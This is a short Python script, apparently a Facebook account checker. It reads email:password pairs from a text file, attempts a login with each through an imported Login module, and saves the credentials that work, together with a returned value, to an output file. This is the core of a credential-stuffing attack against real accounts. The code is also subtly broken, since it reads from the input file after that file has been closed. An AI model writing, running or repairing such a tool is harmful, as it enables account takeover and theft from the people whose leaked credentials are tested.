from pages_functions.Facebook.Login import *
with open("Newt.txt", "r") as file:
    lines = file.readlines()
    
with open("output.txt", "w") as output_file:
    lines = file.readlines()
    for line in lines:
        e , p  = line.strip().split(":")
        result = Login(e,p).Start()
        if result[0] == "success" :
            if result[2] : output_file.write(f"{e}:{p}:{result[1]}" + "\n")
            else : print("CheckPoint")
        else : print (result)
        